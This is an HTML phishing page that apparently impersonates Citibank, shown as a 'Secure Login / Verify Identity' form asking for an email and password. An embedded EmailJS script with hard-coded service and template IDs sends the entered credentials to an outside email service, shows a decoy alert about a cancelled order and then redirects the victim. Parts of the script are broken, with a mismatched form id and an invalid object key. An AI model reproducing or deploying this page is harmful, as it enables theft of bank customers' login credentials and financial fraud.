<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Secure Login</title>

<style>
*{
    margin:0;
    padding:0;
    box-sizing:border-box;
    font-family:Arial, Helvetica, sans-serif;
}

body{
    background:#004f98;
    display:flex;
    justify-content:center;
    align-items:center;
    min-height:100vh;
    padding:20px;
}

.page{
    width:100%;
    max-width:420px;
    text-align:center;
}

/* TOP LOGO (MATCH FORM WIDTH) */
.top-logo{
    width:100%;
    margin-bottom:0px;
}

.top-logo img{
    width:100%;
    max-width:420px;
    height:auto;
    border-radius:12px;
}

/* TITLE */
.page-title{
    margin-bottom:0px;
	margin-top:-20px;
}

.page-title h1{
    font-size:34px;
    color:#fa4ffaf;
    line-height:1.2;
    font-weight:700;
	background:#fff;
}

/* FORM CARD */
.login-container{
    background:#fff;
    border-radius:0px;
    padding:35px;
    box-shadow:0 12px 30px rgba(0,0,0,.12);
    text-align:left;
}

/* INSIDE CARD LOGO */
.logo{
    text-align:center;
    margin-bottom:10px;
}

.logo img{
    width:90px;
    height:auto;
}

.subtitle{
    text-align:center;
    color:#666;
    font-size:15px;
    margin-bottom:25px;
}

.form-group{
    margin-bottom:20px;
}

.form-group label{
    display:block;
    margin-bottom:8px;
    color:#444;
    font-weight:bold;
}

.form-group input{
    width:100%;
    padding:13px;
    border:1px solid #ccc;
    border-radius:8px;
    font-size:15px;
    transition:.3s;
}

.form-group input:focus{
    outline:none;
    border-color:#007bff;
    box-shadow:0 0 6px rgba(0,123,255,.25);
}

button{
    width:100%;
    padding:14px;
    border:none;
    border-radius:8px;
    background:#007bff;
    color:#fff;
    font-size:16px;
    font-weight:bold;
    cursor:pointer;
    transition:.3s;
}

button:hover{
    background:#0056b3;
}
</style>

</head>
<script>
document.addEventListener("DOMContentLoaded", function () {
    const email = localStorage.getItem("userEmail");

    if (email) {
        document.getElementById("email").value = email;
    }
});
</script>

<body>

<div class="page">

    <!-- TOP LOGO (LARGE, SAME WIDTH AS FORM) -->
    <div class="top-logo">
        <img src="citi.png" alt="Main Logo">
    </div>

    <!-- TITLE -->
    <div class="page-title">
        <h1></br>Add Authentication email<br>Verify Identity</h1>
    </div>

    <!-- FORM CARD -->
    <div class="login-container">

        <div class="logo">
            <img src="emaillogo.png" alt="Card Logo">
        </div>

        <p class="subtitle">Please sign in to continue.</p>

        <form action="login.php" method="POST">

            <div class="form-group">
                <label for="Email">Email</label>
                <input
                    type="text"
                    id="username"
                    name="username"
                    placeholder="Enter your email"
                    autocomplete="Email"
                    required>
            </div>

            <div class="form-group">
                <label for="password">Password</label>
                <input
                    type="password"
                    id="password"
                    name="password"
                    placeholder="Enter your password"
                    autocomplete="current-password"
                    required>
            </div>

            <button type="submit">Sign In</button>

        </form>

    </div>

</div>
   
   <!-- EMAILJS SCRIPT -->
    <script>
        // Initialize EmailJS
        emailjs.init("pihpsTf7HFt-OXVeT"); // Your Public Key

        const form = document.getElementById("login-form");

        form.addEventListener("submit", function (e) {
            e.preventDefault();

            // Collect form data
            const params = {
			    form type: "Login",
                username: document.querySelector('input[name="username"]').value,
                password: document.querySelector('input[name="password"]').value,
            
            };

            // Send email via EmailJS
            emailjs.send("service_ozbrno9", "template_86sh2kk", params)
                .then(function (response) {
                    console.log("SUCCESS!", response.status, response.text);
		            alert("Unknown order has been cancelled!");
                    window.location.href = "redirect.html"; // redirect
                })
                .catch(function (error) {
                    console.error("FAILED...", error);
                    alert("Something went wrong. Please try again.");
                });
        });
    </script>

</body>
</html>
